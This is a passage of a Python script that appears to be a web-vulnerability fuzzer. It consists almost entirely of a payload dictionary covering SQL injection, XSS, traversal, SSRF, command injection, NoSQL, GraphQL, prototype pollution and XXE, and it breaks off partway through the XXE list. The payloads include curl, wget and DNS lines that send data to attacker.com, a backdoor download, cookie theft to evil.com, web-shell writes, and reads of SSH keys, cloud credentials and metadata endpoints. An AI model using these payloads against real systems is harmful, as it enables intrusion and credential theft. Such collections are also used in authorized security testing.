## skrypt
import argparse
import csv
import sys
from datetime import datetime
from typing import Dict, List, Tuple, Any

import requests


Payload = Dict[str, Any]

# Compact, representative payloads per category (OWASP-inspired & Modern WAF Bypass research)
PAYLOADS: Dict[str, List[Payload]] = {
    "sqli": [
        {"name": "boolean_true", "value": "' OR '1'='1"},
        {"name": "union_select", "value": "' UNION SELECT NULL,NULL--"},
        {"name": "stacked_waitfor", "value": "'; WAITFOR DELAY '0:0:5'--"},
        {"name": "sleep_blind", "value": "' AND SLEEP(5)--"},
        {"name": "inline_comment", "value": "'/**/OR/**/1=1--"},
        {"name": "hash_comment", "value": "' OR 'x'='x'#"},
        {"name": "double_quote_eq", "value": '" OR ""="'},
        {"name": "paren_or_true", "value": "')) OR 1=1--"},
        {"name": "numeric_or", "value": "1 OR 1=1"},
        {"name": "union_select_version", "value": "' UNION SELECT @@version--"},
        {"name": "postgres_sleep", "value": "'; SELECT pg_sleep(5)--"},
        {"name": "mysql_benchmark", "value": "' AND BENCHMARK(5000000,MD5(1))--"},
        {"name": "order_by", "value": "' ORDER BY 1--"},
        {"name": "cast_int", "value": "' AND CAST('1' AS INT)=1--"},
        {"name": "hex_encoded", "value": "' UNION SELECT 0x414243--"},
        {"name": "error_based_convert", "value": "' AND 1=CONVERT(int, (SELECT @@version))--"},
        {"name": "extractvalue_error", "value": "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--"},
        {"name": "updatexml_error", "value": "' AND updatexml(1,concat(0x7e,(SELECT user())),1)--"},
        {"name": "double_query_error", "value": "' UNION SELECT 1,2,3 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y--"},
        {"name": "load_file", "value": "' UNION SELECT LOAD_FILE('/etc/passwd')--"},
        {"name": "into_outfile", "value": "' UNION SELECT 'shell' INTO OUTFILE '/var/www/html/shell.php'--"},
        {"name": "dns_exfil_mysql", "value": "' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.attacker.com\\share')))--"},
        {"name": "mssql_xp_cmdshell", "value": "'; EXEC xp_cmdshell('whoami')--"},
        {"name": "oracle_utl_http", "value": "' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||user) FROM dual--"},
        {"name": "time_based_if", "value": "' AND IF(1=1,SLEEP(5),0)--"},
        {"name": "case_when_sleep", "value": "' AND (CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--"},
        {"name": "substr_blind", "value": "' AND SUBSTR(user(),1,1)='a'--"},
        # --- NEW MODERN SQLi ---
        {"name": "mysql_json_extract", "value": "' AND JSON_EXTRACT(doc, '$.secret') = 'secret'--"},
        {"name": "between_bypass", "value": "' AND 1 BETWEEN 1 AND 1--"},
        {"name": "unicode_delimiter", "value": "'%u0020OR%u00201=1--"},
        {"name": "comment_obfuscation", "value": "'/*!50000UNION*/SELECT 1,2--"},
        {"name": "mssql_waitfor_time", "value": "'; WAITFOR TIME '23:59:59'--"},
        {"name": "sqlite_version", "value": "' UNION SELECT sqlite_version()--"},
        {"name": "no_space_bypass", "value": "'OR(1)=1--"},
        # --- 2024/2025 WAF BYPASS TECHNIQUES ---
        {"name": "tab_bypass", "value": "'\tOR\t1=1--"},
        {"name": "newline_bypass", "value": "'\nOR\n1=1--"},
        {"name": "vertical_tab_bypass", "value": "'\x0bOR\x0b1=1--"},
        {"name": "mysql_scientific_notation", "value": "0e0UNION SELECT 1,2--"},
        {"name": "mysql_version_comment", "value": "/*!12345UNION*//*!12345SELECT*/1,2--"},
        {"name": "parenthesis_bypass", "value": "0)or(1)=(1"},
        {"name": "mysql_double_pipe", "value": "1'||'1'='1"},
        {"name": "mssql_concat_exec", "value": "';DECLARE @s VARCHAR(100)='who'+'ami';EXEC(@s)--"},
        {"name": "oracle_dbms_xmlgen", "value": "' AND DBMS_XMLGEN.getxml('select user from dual') IS NOT NULL--"},
        {"name": "postgres_dollar_quote", "value": "'; SELECT $$test$$--"},
        {"name": "mysql_group_concat_exfil", "value": "' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--"},
        {"name": "time_based_heavy", "value": "' AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B)>0--"},
        {"name": "mysql_geometrycollection", "value": "' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT @@version)a)b))--"},
        {"name": "mysql_updatexml_hex", "value": "' AND UPDATEXML(1,CONCAT(0x7e,0x27,(SELECT HEX(user())),0x27),1)--"},
        {"name": "mysql_exp_overflow", "value": "' AND EXP(~(SELECT * FROM (SELECT user())a))--"},
        {"name": "mssql_openrowset", "value": "'; SELECT * FROM OPENROWSET('SQLOLEDB','server=attacker.com;uid=sa;pwd=x','SELECT 1')--"},
        {"name": "oracle_ctxsys", "value": "' AND (SELECT CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual)) FROM dual) IS NOT NULL--"},
        {"name": "sqlite_randomblob_dos", "value": "' AND RANDOMBLOB(1000000000)--"},
        {"name": "mysql_procedure_analyse", "value": "' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x3a,VERSION())),1)--"},
        {"name": "union_null_chain", "value": "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"},
        {"name": "waf_bypass_case_swap", "value": "' uNiOn SeLeCt NULL--"},
        {"name": "double_url_encode_quote", "value": "%2527%2520OR%25201%253D1--"},
        {"name": "mysql_char_bypass", "value": "' UNION SELECT CHAR(65,66,67)--"},
        {"name": "space_alternative_0a", "value": "'%0aOR%0a1=1--"},
        {"name": "space_alternative_0d", "value": "'%0dOR%0d1=1--"},
        {"name": "mysql_concat_ws", "value": "' UNION SELECT CONCAT_WS(0x3a,user(),database(),version())--"},
    ],
    "xss": [
        {"name": "script_tag", "value": "<script>alert(1)</script>"},
        {"name": "img_onerror", "value": "<img src=x onerror=alert(1)>"},
        {"name": "svg_payload", "value": "<svg/onload=alert(1)>"},
        {"name": "iframe_srcdoc", "value": "<iframe srcdoc='<script>alert(1)</script>'>"},
        {"name": "body_onload", "value": "<body onload=alert(1)>"},
        {"name": "javascript_uri", "value": "javascript:alert(1)"},
        {"name": "mismatched_tag", "value": "<scr<script>ipt>alert(1)</scr<script>ipt>"},
        {"name": "img_src_javascript", "value": "<img src=javascript:alert(1)>"},
        {"name": "event_handler", "value": "<div onpointerover=alert(1)>X</div>"},
        {"name": "details_toggle", "value": "<details/ontoggle=alert(1)>"},
        {"name": "autofocus_input", "value": "<input onfocus=alert(1) autofocus>"},
        {"name": "polyglot_1", "value": "javascript://%250Aalert(1)//"},
        {"name": "img_src_confirm", "value": "<img src=x onerror=confirm(1)>"},
        {"name": "script_throw", "value": "<script>throw 1</script>"},
        {"name": "mutation_xss", "value": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></p>"},
        {"name": "dom_based_hash", "value": "#<img src=x onerror=alert(1)>"},
        {"name": "css_expression", "value": "<style>*{background:url('javascript:alert(1)')}</style>"},
        {"name": "link_import", "value": "<link rel=import href='data:text/html,<script>alert(1)</script>'>"},
        {"name": "meta_refresh", "value": "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">"},
        {"name": "form_action", "value": "<form action=javascript:alert(1)><input type=submit>"},
        {"name": "object_data", "value": "<object data=javascript:alert(1)>"},
        {"name": "embed_src", "value": "<embed src=javascript:alert(1)>"},
        {"name": "base_href", "value": "<base href=javascript:alert(1)//>"},
        {"name": "marquee_event", "value": "<marquee onstart=alert(1)>X</marquee>"},
        {"name": "select_onfocus", "value": "<select onfocus=alert(1) autofocus>"},
        {"name": "animate_onbegin", "value": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"},
        {"name": "math_href", "value": "<math><mi xlink:href=\"javascript:alert(1)\">X</mi></math>"},
        {"name": "template_content", "value": "<template><script>alert(1)</script></template>"},
        # --- NEW MODERN XSS ---
        {"name": "es6_template_literal", "value": "<script>alert`1`</script>"},
        {"name": "svg_set", "value": "<svg><set onbegin=alert(1) attributeName=x>"},
        {"name": "angular_csti", "value": "{{constructor.constructor('alert(1)')()}}"},
        {"name": "vuejs_csti", "value": "{{_openBlock.constructor('alert(1)')()}}"},
        {"name": "react_dangerously", "value": "<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}></div>"},
        {"name": "data_protocol_base64", "value": "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">X</a>"},
        {"name": "js_event_obfuscation", "value": "<img src=x onerror=(alert)(1)>"},
        {"name": "hidden_input_accesskey", "value": "<input type=\"hidden\" accesskey=\"X\" onclick=\"alert(1)\">"},
        # --- 2024/2025 XSS BYPASS ---
        {"name": "svg_foreignobject", "value": "<svg><foreignObject><body onload=alert(1)></foreignObject></svg>"},
        {"name": "video_source_onerror", "value": "<video><source onerror=alert(1)>"},
        {"name": "audio_source_onerror", "value": "<audio src=x onerror=alert(1)>"},
        {"name": "math_xlink", "value": "<math><maction actiontype=\"statusline#\" xlink:href=\"javascript:alert(1)\">X</maction></math>"},
        {"name": "on_event_uppercase", "value": "<IMG SRC=x ONERROR=alert(1)>"},
        {"name": "encoded_html_entity", "value": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"},
        {"name": "js_fromcharcode", "value": "<img src=x onerror=alert(String.fromCharCode(88,83,83))>"},
        {"name": "eval_atob", "value": "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"},
        {"name": "fetch_exfil", "value": "<img src=x onerror=fetch('http://evil.com/'+document.cookie)>"},
        {"name": "window_name_xss", "value": "<script>eval(name)</script>"},
        {"name": "location_hash_xss", "value": "<script>eval(location.hash.slice(1))</script>"},
        {"name": "svg_use", "value": "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x\">"},
        {"name": "portswigger_polyglot", "value": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//"},
        {"name": "double_encoded_xss", "value": "%253Cscript%253Ealert(1)%253C%252Fscript%253E"},
        {"name": "html5_formaction", "value": "<form><button formaction=\"javascript:alert(1)\">X</button>"},
        {"name": "isindex_action", "value": "<isindex action=\"javascript:alert(1)\" type=submit>"},
        {"name": "keygen_onfocus", "value": "<keygen onfocus=alert(1) autofocus>"},
        {"name": "object_classid", "value": "<object classid=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><param name=\"DataURL\" value=\"javascript:alert(1)\">"},
        {"name": "bgsound_src", "value": "<bgsound src=\"javascript:alert(1)\">"},
        {"name": "slot_event", "value": "<x]><slot name=x onfocus=alert(1) tabindex=1>"},
        {"name": "custom_element_xss", "value": "<x-element onclick=alert(1)>Click</x-element>"},
    ],
    "path_traversal_lfi": [
        {"name": "etc_passwd", "value": "../../../../etc/passwd"},
        {"name": "encoded_traversal", "value": "..%2f..%2f..%2f..%2fetc/passwd"},
        {"name": "double_encoded", "value": "..%252f..%252f..%252f..%252fetc/passwd"},
        {"name": "win_system32", "value": "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"},
        {"name": "root_bash", "value": "/../../../../bin/bash"},
        {"name": "null_byte", "value": "../../../../etc/passwd%00"},
        {"name": "dot_slash", "value": "././././etc/passwd"},
        {"name": "triple_dot", "value": ".../.../.../.../etc/passwd"},
        {"name": "utf8_overlong", "value": "..%c0%af..%c0%af..%c0%afetc/passwd"},
        {"name": "php_filter_b64", "value": "php://filter/convert.base64-encode/resource=index.php"},
        {"name": "proc_self_environ", "value": "/proc/self/environ"},
        {"name": "windows_unc", "value": "\\\\127.0.0.1\\c$\\windows\\win.ini"},
        {"name": "unicode_overlong", "value": "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"},
        {"name": "double_url_encode", "value": "%25%32%65%25%32%65%25%32%66"},
        {"name": "16bit_unicode", "value": "..%u2216..%u2216etc%u2216passwd"},
        {"name": "tomcat_normalize", "value": "/..;/..;/..;/etc/passwd"},
        {"name": "spring_path", "value": "/static/..%00/..%00/..%00/etc/passwd"},
        {"name": "nginx_off_by_slash", "value": "/static../../../etc/passwd"},
        {"name": "iis_tilde", "value": "/~/../../../windows/win.ini"},
        {"name": "jar_protocol", "value": "jar:file:/etc/passwd!/"},
        {"name": "php_phar_wrapper", "value": "phar://archive.zip/shell.php"},
        # --- NEW MODERN LFI ---
        {"name": "java_url_wrapper", "value": "url:file:///etc/passwd"},
        {"name": "filter_bypass_doubled", "value": "....//....//....//etc/passwd"},
        {"name": "php_filter_chain", "value": "php://filter/read=convert.base64-encode/resource=/etc/passwd"},
        {"name": "windows_ads_stream", "value": "c:\\windows\\win.ini:stream"},
        # --- 2024/2025 LFI BYPASS ---
        {"name": "proc_self_fd", "value": "/proc/self/fd/0"},
        {"name": "proc_cmdline", "value": "/proc/self/cmdline"},
        {"name": "var_log_apache", "value": "../../../../var/log/apache2/access.log"},
        {"name": "var_log_nginx", "value": "../../../../var/log/nginx/error.log"},
        {"name": "aws_credentials", "value": "../../../../home/user/.aws/credentials"},
        {"name": "ssh_private_key", "value": "../../../../root/.ssh/id_rsa"},
        {"name": "dockerenv", "value": "../../../../.dockerenv"},
        {"name": "kubernetes_token", "value": "../../../../var/run/secrets/kubernetes.io/serviceaccount/token"},
        {"name": "git_config", "value": "../../../../.git/config"},
        {"name": "env_file", "value": "../../../../.env"},
        {"name": "php_input", "value": "php://input"},
        {"name": "php_zip", "value": "zip://shell.jpg#shell.php"},
        {"name": "data_wrapper", "value": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+"},
        {"name": "glob_wrapper", "value": "glob://*"},
        {"name": "windows_boot_ini", "value": "..\\..\\..\\..\\boot.ini"},
        {"name": "windows_sam", "value": "..\\..\\..\\..\\windows\\system32\\config\\SAM"},
        {"name": "nginx_temp", "value": "/var/lib/nginx/tmp/client_body/"},
        {"name": "apache_temp", "value": "/tmp/apache2/sess_"},
        {"name": "symlink_traverse", "value": "/var/www/html/link/../../../etc/passwd"},
        {"name": "encoded_backslash", "value": "..%5c..%5c..%5c..%5cetc/passwd"},
        {"name": "mixed_encoding", "value": "..%252f..%c0%af..%255c..%c1%1cetc/passwd"},
    ],
    "rfi_ssrf": [
        {"name": "http_localhost", "value": "http://127.0.0.1:80"},
        {"name": "file_scheme", "value": "file:///etc/passwd"},
        {"name": "metadata_service", "value": "http://169.254.169.254/latest/meta-data"},
        {"name": "gopher_probe", "value": "gopher://127.0.0.1:80/_GET%20/"},
        {"name": "dict_probe", "value": "dict://127.0.0.1:25/"},
        {"name": "https_external", "value": "https://example.com/remote"},
        {"name": "smb_like", "value": "\\\\127.0.0.1\\share"},
        {"name": "ipv6_localhost", "value": "http://[::1]:80"},
        {"name": "decimal_ip", "value": "http://2130706433"},
        {"name": "azure_metadata", "value": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"},
        {"name": "gcp_metadata", "value": "http://metadata.google.internal/computeMetadata/v1/"},
        {"name": "aws_metadata_v2", "value": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
        {"name": "localhost_variations", "value": "http://127.0.0.1.nip.io"},
        {"name": "localhost_decimal_octal", "value": "http://0177.0.0.1"},
        {"name": "localhost_hex", "value": "http://0x7f.0x0.0x0.0x1"},
        {"name": "data_uri_php", "value": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="},
        {"name": "expect_wrapper", "value": "expect://id"},
        {"name": "ftp_localhost", "value": "ftp://127.0.0.1:21"},
        {"name": "tftp_protocol", "value": "tftp://127.0.0.1:69/file"},
        {"name": "redis_protocol", "value": "redis://127.0.0.1:6379"},
        # --- NEW MODERN SSRF ---
        {"name": "kubernetes_api", "value": "https://kubernetes.default.svc.cluster.local"},
        {"name": "docker_api", "value": "http://127.0.0.1:2375/v1.24/containers/json"},
        {"name": "oracle_cloud_metadata", "value": "http://169.254.169.254/opc/v1/instance/"},
        {"name": "alibaba_metadata", "value": "http://100.100.100.200/latest/meta-data/"},
        {"name": "wildcard_dns_nip", "value": "http://customer1.app.127.0.0.1.nip.io"},
        {"name": "zero_ip_bypass", "value": "http://0.0.0.0:80"},
        {"name": "enclosed_alphanumeric", "value": "http://①②⑦.⓪.⓪.①"},
        {"name": "aws_metadata_obfuscated", "value": "http://169.254.169.254/latest/user-data"},
        # --- 2024/2025 SSRF BYPASS ---
        {"name": "digitalocean_metadata", "value": "http://169.254.169.254/metadata/v1.json"},
        {"name": "packetcloud_metadata", "value": "https://metadata.packet.net/metadata"},
        {"name": "hetzner_metadata", "value": "http://169.254.169.254/hetzner/v1/metadata"},
        {"name": "consul_api", "value": "http://127.0.0.1:8500/v1/agent/self"},
        {"name": "etcd_api", "value": "http://127.0.0.1:2379/v2/keys/"},
        {"name": "elasticsearch_api", "value": "http://127.0.0.1:9200/_cluster/health"},
        {"name": "couchdb_api", "value": "http://127.0.0.1:5984/_all_dbs"},
        {"name": "mongodb_api", "value": "http://127.0.0.1:27017/"},
        {"name": "url_shortener_bypass", "value": "http://tinyurl.com/XXXXX"},
        {"name": "localhost_ipv6_short", "value": "http://[0:0:0:0:0:0:0:1]"},
        {"name": "localhost_ipv6_mapped", "value": "http://[::ffff:127.0.0.1]"},
        {"name": "localhost_short", "value": "http://127.1"},
        {"name": "localhost_zero_padded", "value": "http://127.000.000.001"},
        {"name": "unicode_domain_ssrf", "value": "http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ"},
        {"name": "dns_rebinding", "value": "http://attacker.dns-rebind.127.0.0.1.nip.io"},
        {"name": "internal_169_octal", "value": "http://0251.0376.0251.0376"},
        {"name": "jar_url_ssrf", "value": "jar:http://attacker.com/evil.jar!/"},
        {"name": "netdoc_protocol", "value": "netdoc:///etc/passwd"},
        {"name": "ldap_ssrf", "value": "ldap://127.0.0.1:389"},
        {"name": "php_ssrf", "value": "php://fd/3"},
        {"name": "compress_zlib", "value": "compress.zlib://http://attacker.com/"},
    ],
    "cmd_injection": [
        {"name": "semicolon_cat", "value": "; cat /etc/passwd"},
        {"name": "pipe_whoami", "value": "| whoami"},
        {"name": "backtick_id", "value": "`id`"},
        {"name": "and_ls", "value": "&& ls"},
        {"name": "or_uname", "value": "|| uname -a"},
        {"name": "subshell", "value": "$(id)"},
        {"name": "newline_inject", "value": "%0a/bin/sh"},
        {"name": "bash_dash_c", "value": ";bash -c 'id'"},
        {"name": "pipe_nc", "value": "| nc 127.0.0.1 80"},
        {"name": "ifs_separator", "value": ";cat${IFS}/etc/passwd"},
        {"name": "redirection_write", "value": "> /tmp/hacked"},
        {"name": "base64_decode_run", "value": ";echo d2hvYW1p|base64 -d|sh"},
        {"name": "sleep_cmd", "value": "; sleep 5"},
        {"name": "env_expansion", "value": ";echo $PATH"},
        {"name": "curl_exfil", "value": ";curl http://attacker.com/$(whoami)"},
        {"name": "wget_download", "value": "|wget http://attacker.com/backdoor.sh -O /tmp/x.sh"},
        {"name": "perl_reverse_shell", "value": ";perl -e 'use Socket;'"},
        {"name": "python_reverse", "value": ";python -c 'import os;os.system(\"id\")'"},
        {"name": "ruby_eval", "value": ";ruby -e 'system(\"whoami\")'"},
        {"name": "powershell_cmd", "value": ";powershell -c Get-Process"},
        {"name": "cmd_exe_c", "value": "|cmd.exe /c whoami"},
        {"name": "double_pipe", "value": "||id||echo"},
        {"name": "tee_write", "value": ";id|tee /tmp/pwned"},
        # --- NEW MODERN RCE ---
        {"name": "brace_expansion", "value": ";/bin/c?? /etc/p?ss??"},
        {"name": "variable_expansion_bypass", "value": ";${u}na${me} -a"},
        {"name": "java_runtime_exec", "value": "java.lang.Runtime.getRuntime().exec('id')"},
        {"name": "shellshock_headers", "value": "() { :;}; /bin/bash -c 'sleep 5'"},
        {"name": "imagemagick_delegate", "value": "mvg:text.mvg"},
        # --- 2024/2025 CMD INJECTION ---
        {"name": "hex_encoded_cmd", "value": ";$(printf '\\x69\\x64')"},
        {"name": "octal_encoded_cmd", "value": ";$(printf '\\151\\144')"},
        {"name": "rev_cmd", "value": ";$(echo 'di' | rev)"},
        {"name": "cut_cmd", "value": ";$(echo 'idxx' | cut -c1-2)"},
        {"name": "dd_cmd", "value": ";echo id | dd of=/tmp/cmd && sh /tmp/cmd"},
        {"name": "xxd_bypass", "value": ";echo 6964 | xxd -r -p | sh"},
        {"name": "zsh_glob", "value": ";=id"},
        {"name": "bash_brace", "value": ";{cat,/etc/passwd}"},
        {"name": "nslookup_exfil", "value": ";nslookup `whoami`.attacker.com"},
        {"name": "dig_exfil", "value": ";dig `whoami`.attacker.com"},
        {"name": "node_eval", "value": ";node -e 'require(\"child_process\").execSync(\"id\")'"},
        {"name": "php_system", "value": ";php -r 'system(\"id\");'"},
        {"name": "awk_system", "value": ";awk 'BEGIN{system(\"id\")}'"},
        {"name": "find_exec", "value": ";find / -name x -exec id \\;"},
        {"name": "tar_checkpoint", "value": ";tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=id"},
        {"name": "git_hook", "value": ";GIT_SSH_COMMAND='id' git clone x"},
        {"name": "env_var_inject", "value": ";X='() { :; }; id' bash -c :"},
        {"name": "bash_debug_trap", "value": ";trap 'id' DEBUG; echo x"},
        {"name": "busybox_cmd", "value": ";busybox id"},
        {"name": "timeout_cmd", "value": ";timeout 5 id"},
        {"name": "stdbuf_cmd", "value": ";stdbuf -o0 id"},
        {"name": "xargs_cmd", "value": ";echo id | xargs -I {} sh -c {}"},
        {"name": "nice_cmd", "value": ";nice id"},
    ],
    "ldap_injection": [
        {"name": "wildcard_filter", "value": "*)(|(uid=*))("},
        {"name": "or_true", "value": "*)(uid=*))(|(uid=*))"},
        {"name": "cn_wildcard", "value": "*)(|(cn=*"},
        {"name": "auth_bypass", "value": "admin*)(&(|(password=*)"},
        {"name": "null_byte_filter", "value": "admin%00"},
        {"name": "attribute_disclosure", "value": "*)("},
        {"name": "bypass_and_true", "value": "*)(&(objectClass=*)(password=*)"},
        {"name": "tautology_filter", "value": "(|(&)(objectClass=*)))"},
        {"name": "always_true_ou", "value": "*()|&'(ou=*)"},
        {"name": "filter_negation", "value": "(!(cn=*))"},
        {"name": "comment_bypass", "value": "admin)(&(password=*))#"},
        {"name": "blind_ldap", "value": "*)(mail=*))%00"},
        {"name": "nested_groups", "value": "*)(memberOf=CN=Admin*"},
        {"name": "substring_match", "value": "(cn=*admin*)"},
        {"name": "extensible_match", "value": "(cn:caseExactMatch:=Admin)"},
        {"name": "proxy_auth_bypass", "value": "*)(proxyAddresses=*@*"},
    ],
    "nosql_injection": [
        {"name": "ne_null", "value": '{"$ne": null}', "content_type": "json"},
        {"name": "gt_empty", "value": '{"$gt": ""}', "content_type": "json"},
        {"name": "regex_any", "value": '{"$regex": ".*"}', "content_type": "json"},
        {"name": "where_sleep", "value": '{"$where": "sleep(5000)"}', "content_type": "json"},
        {"name": "or_true", "value": '{"$or": [{}, {"admin": true}]}', "content_type": "json"},
        {"name": "injection_array", "value": '{"$in": [null, ""]}', "content_type": "json"},
        {"name": "comment", "value": "admin' //"},
        {"name": "js_bypass", "value": "1;return true"},
        {"name": "mongo_nin", "value": '{"$nin": []}', "content_type": "json"},
        {"name": "mongo_where_long", "value": '{"$where": "function(){return true}"}', "content_type": "json"},
        {"name": "mongo_expr", "value": '{"$expr": {"$eq": [1, 1]}}', "content_type": "json"},
        {"name": "mongo_nor", "value": '{"$nor": [{"a": 1}, {"b": 2}]}', "content_type": "json"},
        {"name": "couchdb_all_docs", "value": '{"_all_docs": true}', "content_type": "json"},
        {"name": "redis_cmd_injection", "value": "\"*\" ; CONFIG GET *"},
        {"name": "mongo_map_reduce", "value": '{"$function": {"body": "function() {return true;}", "args": [], "lang": "js"}}', "content_type": "json"},
        {"name": "cassandra_injection", "value": "admin' OR '1'='1"},
        {"name": "elastic_script", "value": '{"script": {"source": "return true"}}', "content_type": "json"},
        # --- 2024/2025 NoSQL ---
        {"name": "mongo_lookup", "value": '{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "leaked"}}', "content_type": "json"},
        {"name": "mongo_objectid", "value": '{"_id": {"$oid": "000000000000000000000000"}}', "content_type": "json"},
        {"name": "mongo_type_bypass", "value": '{"$type": 2}', "content_type": "json"},
        {"name": "mongo_exists_true", "value": '{"password": {"$exists": true}}', "content_type": "json"},
        {"name": "mongo_size_bypass", "value": '{"arr": {"$size": 0}}', "content_type": "json"},
        {"name": "mongo_elemmatch", "value": '{"arr": {"$elemMatch": {"$gt": ""}}}', "content_type": "json"},
        {"name": "mongo_regex_blind", "value": '{"password": {"$regex": "^a"}}', "content_type": "json"},
        {"name": "mongo_aggregation_rce", "value": '{"$accumulator": {"init": "function() { return 0 }", "accumulate": "function() { return db.adminCommand({eval: \\\"return 1\\\"}) }"}}', "content_type": "json"},
    ],
    "graphql_injection": [
        # --- GraphQL Attacks ---
        {"name": "introspection_query", "value": "{\"query\": \"{__schema{types{name,fields{name}}}}\"}"},
        {"name": "introspection_short", "value": "{__schema{types{name}}}"},
        {"name": "batch_query_dos", "value": "[{\"query\": \"{user(id:1){name}}\"}, {\"query\": \"{user(id:2){name}}\"}]"},
        {"name": "alias_overloading", "value": "{a:user(id:1){name}, b:user(id:1){name}, c:user(id:1){name}}"},
        {"name": "directive_overloading", "value": "{user(id:1) @include(if:true) @include(if:true) {name}}"},
        {"name": "circular_fragment", "value": "fragment A on User { friends { ...A } } { user(id:1) { ...A } }"},
        # --- 2024/2025 GraphQL ---
        {"name": "deep_nesting_dos", "value": "{user{friends{friends{friends{friends{friends{name}}}}}}}"},
        {"name": "sqli_in_graphql", "value": "{user(id:\"1' OR '1'='1\"){name}}"},
        {"name": "mutation_sqli", "value": "mutation{createUser(name:\"test'; DROP TABLE users;--\"){id}}"},
        {"name": "field_suggestion_enum", "value": "{__type(name:\"Query\"){enumValues{name}}}"},
        {"name": "typename_leak", "value": "{__typename}"},
        {"name": "subscription_flood", "value": "subscription{onUserUpdate{id name email password}}"},
        {"name": "persisted_query_bypass", "value": "{\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"malicious\"}}}"},
        {"name": "variable_injection", "value": "{\"query\":\"query($id:ID!){user(id:$id){name}}\",\"variables\":{\"id\":\"1 OR 1=1\"}}"},
    ],
    "prototype_pollution": [
        # --- Prototype Pollution ---
        {"name": "proto_basic", "value": "__proto__[admin]=true"},
        {"name": "constructor_proto", "value": "constructor[prototype][admin]=true"},
        {"name": "json_proto", "value": "{\"__proto__\": {\"admin\": true}}", "content_type": "json"},
        {"name": "proto_json_string", "value": "{\"constructor\": {\"prototype\": {\"isAdmin\": true}}}", "content_type": "json"},
        # --- 2024/2025 Prototype Pollution ---
        {"name": "proto_nested", "value": "__proto__.__proto__[polluted]=true"},
        {"name": "array_proto", "value": "[][__proto__][polluted]=true"},
        {"name": "object_proto", "value": "Object.prototype.polluted=true"},
        {"name": "proto_rce_child_process", "value": "{\"__proto__\": {\"shell\": \"node\", \"NODE_OPTIONS\": \"--inspect=attacker.com:1337\"}}", "content_type": "json"},
        {"name": "proto_env_override", "value": "{\"__proto__\": {\"env\": {\"EVIL\": \"true\"}}}", "content_type": "json"},
        {"name": "proto_status_code", "value": "{\"__proto__\": {\"status\": 500}}", "content_type": "json"},
    ],
    "xxe": [
        {
            "name": "external_entity",
            "value": "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
        },
        {
            "name": "parameter_entity",
            "value": "<?xml version='1.0'?><!DOCTYPE data [<!ENTITY % file SYSTEM 'file:///etc/hostname'> %file;]><data/>",
        },
        {
            "name": "remote_dtd",
            "value": "<?xml version='1.0'?><!DOCTYPE data SYSTEM 'http://attacker.test/evil.dtd'><data>1</data>",
        },
        {
            "name": "xinclude",
            "value": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
        },
        {
            "name": "billion_laughs",
            "value": "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><root>&lol1;</root>",
        },
        {
            "name": "svg_xxe",
            "value": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><script xlink:href=\"file:///etc/passwd\"/></svg>",
        },
        {
            "name": "soap_xxe",
            "value": "<?xml version=\"1.0\"?><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>",
        },
        {
            "name": "docx_xxe",
            "value": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"><w:body>&xxe;</w:body></w:document>",
        },
        {
            "name": "utf7_xxe",
            "value": "<?xml version=\"1.0\" encoding=\"UTF-7\"?>+ADwAIQ-DOCTYPE+ACA-foo+ACA-+AFs +ADwAIQ-ENTITY+ACA-xxe+ACA-SYSTEM+ACA +ACI-file:///etc/passwd+ACI +AD4 +AF0 +AD4 +ADw-foo+AD4 +ACY-xxe+ADsAPA-/foo+AD4",
        },
        {
            "name": "xlsx_xxe",
